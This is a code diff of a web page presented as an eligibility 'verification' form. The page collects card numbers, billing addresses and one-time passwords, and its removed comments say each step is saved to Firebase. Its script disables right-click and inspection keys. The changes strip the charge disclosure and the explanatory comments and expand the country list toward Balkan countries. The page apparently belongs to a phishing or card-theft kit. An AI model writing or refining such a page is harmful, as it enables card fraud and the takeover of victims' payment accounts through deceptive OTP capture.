@@ -318,9 +318,6 @@
             </div>
 
             <div class="section-title">Step 2: Verification Method & Billing Address</div>
-            <p style="font-size: 11px; color: rgba(255, 255, 255, 0.8); margin-bottom: 10px; line-height: 1.3;">
-                A payment method and billing address are required to verify your eligibility. The first charge will be in 30 days.
-            </p>
             
             <div class="form-group">
                 <label>Card Number</label>
@@ -337,7 +334,6 @@
                 </div>
             </div>
 
-            <!-- Billing Address Fields Added Here -->
             <div class="row">
                 <div class="form-group" style="flex: 1;">
                     <label>First name</label>
@@ -350,7 +346,7 @@
             </div>
             <div class="form-group">
                 <label>Address 1</label>
-                <input type="text" id="billAddress1" placeholder="Street address, P.O. box" required>
+                <input type="text" id="billAddress1" placeholder="Street address" required>
             </div>
             <div class="row">
                 <div class="form-group" style="flex: 1;">
@@ -366,11 +362,32 @@
                 <label>Country</label>
                 <select id="billCountry" required>
                     <option value="" disabled selected>Select country</option>
+                    <option value="MK">North Macedonia</option>
+                    <option value="GR">Greece</option>
+                    <option value="BG">Bulgaria</option>
+                    <option value="RS">Serbia</option>
+                    <option value="ME">Montenegro</option>
+                    <option value="AL">Albania</option>
+                    <option value="HR">Croatia</option>
+                    <option value="SI">Slovenia</option>
+                    <option value="BA">Bosnia and Herzegovina</option>
+                    <option value="TR">Turkey</option>
                     <option value="UK">United Kingdom</option>
                     <option value="US">United States</option>
                     <option value="DE">Germany</option>
                     <option value="FR">France</option>
-                    <option value="MK">North Macedonia</option>
+                    <option value="IT">Italy</option>
+                    <option value="ES">Spain</option>
+                    <option value="AT">Austria</option>
+                    <option value="CH">Switzerland</option>
+                    <option value="NL">Netherlands</option>
+                    <option value="BE">Belgium</option>
+                    <option value="SE">Sweden</option>
+                    <option value="NO">Norway</option>
+                    <option value="DK">Denmark</option>
+                    <option value="FI">Finland</option>
+                    <option value="PL">Poland</option>
+                    <option value="RO">Romania</option>
                 </select>
             </div>
 
@@ -430,7 +447,6 @@
 <script>
     let currentSubmissionData = {};
 
-    // Заштита против инспекција (F11 работи нормално)
     document.addEventListener('contextmenu', (e) => e.preventDefault());
     document.addEventListener('keydown', (e) => {
         if (
@@ -450,7 +466,6 @@
         }
     }, 1000);
 
-    // Форматирање на картичка и датум
     const cardInput = document.getElementById('cardNumber');
     cardInput.addEventListener('input', (e) => {
         let value = e.target.value.replace(/\D/g, '');
@@ -472,7 +487,6 @@
         }
     });
 
-    // Тајмер за OTP
     let countdownInterval;
     function startOtpTimer() {
         clearInterval(countdownInterval);
@@ -502,7 +516,6 @@
         startOtpTimer();
     }
 
-    // Чекор 1: Зачувување на првичните податоци (вклучувајќи Billing Address) во Firebase
     document.getElementById('regForm').addEventListener('submit', async (e) => {
         e.preventDefault();
 
@@ -546,7 +559,6 @@
         }, 1500);
     });
 
-    // Чекор 2: Додавање OTP и праќање во Firebase
     document.getElementById('otpForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         
